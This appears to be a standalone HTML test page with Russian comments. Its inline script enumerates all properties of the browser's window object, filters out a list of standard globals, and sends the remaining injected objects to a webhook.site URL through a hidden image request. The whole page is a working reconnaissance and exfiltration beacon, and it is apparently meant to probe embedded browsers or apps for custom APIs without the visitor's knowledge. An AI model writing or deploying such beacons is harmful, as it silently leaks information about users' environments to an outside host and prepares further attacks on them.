<!DOCTYPE html>
<html>
<head><title>Testing...</title></head>
<body>
    <h1 id="status">Ждем исполнения скрипта...</h1>

    <script>
    (function() {
        // Список того, что нам НЕ интересно (стандарт браузера)
        var standard = ['window', 'document', 'location', 'navigator', 'console', 'chrome', 'webkit', 'external', 'Object', 'Function', 'Array', 'Number', 'parseFloat', 'parseInt', 'Infinity', 'NaN', 'undefined', 'Boolean', 'String', 'Symbol', 'Date', 'Promise', 'RegExp', 'Error', 'EvalError', 'RangeError', 'ReferenceError', 'SyntaxError', 'TypeError', 'URIError', 'JSON', 'Math', 'Intl', 'ArrayBuffer', 'Uint8Array', 'Int8Array', 'Uint16Array', 'Int16Array', 'Uint32Array', 'Int32Array', 'Float32Array', 'Float64Array', 'Uint8ClampedArray', 'BigInt64Array', 'BigUint64Array', 'DataView', 'Map', 'Set', 'WeakMap', 'WeakSet', 'Proxy', 'Reflect', 'decodeURI', 'decodeURIComponent', 'encodeURI', 'encodeURIComponent', 'escape', 'unescape', 'eval', 'isFinite', 'isNaN', 'atob', 'btoa', 'setTimeout', 'clearTimeout', 'setInterval', 'clearInterval', 'requestAnimationFrame', 'cancelAnimationFrame', 'performance', 'screen', 'devicePixelRatio', 'styleMedia', 'parent', 'opener', 'frames', 'self', 'top', 'length', 'history', 'customElements', 'locationbar', 'menubar', 'personalbar', 'scrollbars', 'statusbar', 'toolbar', 'status', 'closed', 'crypto', 'indexedDB', 'sessionStorage', 'localStorage', 'onbeforeinstallprompt', 'onappinstalled', 'visualViewport', 'speechSynthesis'];

        var custom = [];
        
        // Получаем вообще ВСЕ свойства объекта window
        var allProps = Object.getOwnPropertyNames(window);
        
        allProps.forEach(function(prop) {
            if (standard.indexOf(prop) === -1 && isNaN(prop)) {
                custom.push(prop);
            }
        });

        // Отправляем только "самописные" объекты
        var data = custom.join(',');
        new Image().src = 'https://webhook.site/8b31d71f-32ab-418d-9e3f-e9dd72738799?custom_found=' + encodeURIComponent(data);
    })();
</script>
</body>
</html>
